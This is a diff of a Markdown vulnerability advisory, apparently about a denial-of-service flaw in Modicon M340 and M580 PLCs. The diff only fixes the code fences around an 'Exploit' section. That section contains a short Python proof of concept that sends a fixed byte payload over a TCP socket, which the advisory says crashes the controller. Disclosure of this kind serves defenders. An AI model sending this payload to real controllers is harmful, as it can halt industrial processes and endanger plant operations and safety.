@@ -18,7 +18,7 @@ PLC Modicon line ("m340" & "m580") suffer a denial of services upon receiving a 
 
 ### Exploit:
 
-´´´
+```
 	import socket 
 
 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
@@ -26,8 +26,7 @@ PLC Modicon line ("m340" & "m580") suffer a denial of services upon receiving a 
 	client.send( "\x44\x62\x00\x00\x00\x06\x00\x5a\x00\x20\x00\x00") 
 	client.close()
 
-´´´
-
+```
 
 ***
 
